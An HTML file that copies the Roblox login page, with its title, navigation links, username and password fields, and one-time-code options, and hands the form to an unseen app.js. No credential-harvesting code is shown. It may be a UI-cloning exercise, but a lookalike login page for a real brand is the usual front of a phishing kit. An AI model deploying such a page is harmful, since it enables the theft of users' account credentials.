<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="navbar">
        <div class="nav-links">
            <a href="#">Charts</a>
            <a href="#">Marketplace</a>
            <a href="#">Create</a>
            <a href="#">Robux</a>
        </div>
        <button class="signup-btn">Sign Up</button>
    </div>

    <div class="login-container">
        <div class="login-box">
            <h1>Login to Roblox</h1>
            <form id="login-form">
                <input type="text" id="username" placeholder="Username/Email/Phone" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            <a href="#" class="forgot-link">Forgot Password or Username?</a>
            <div class="divider"></div>
            <button class="secondary-btn">Email Me a One-Time Code</button>
            <button class="secondary-btn">Use Another Device</button>
            <p class="signup-link">Don't have an account? <a href="#">Sign Up</a></p>
        </div>
    </div>

    <script src="app.js"></script>
</body>
</html>
